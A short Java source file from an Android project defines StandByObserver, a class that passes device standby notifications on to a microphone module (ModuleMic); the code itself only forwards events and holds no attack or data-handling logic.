package com.android.dvci.module;

import com.android.dvci.Standby;
import com.android.dvci.interfaces.Observer;

public class StandByObserver implements Observer<Standby> {

	private ModuleMic moduleMic;

	public StandByObserver(ModuleMic moduleMic) {
		this.moduleMic = moduleMic;
	}

	@Override
	public int notification(Standby b) {
		return moduleMic.notification(b);
	}

}


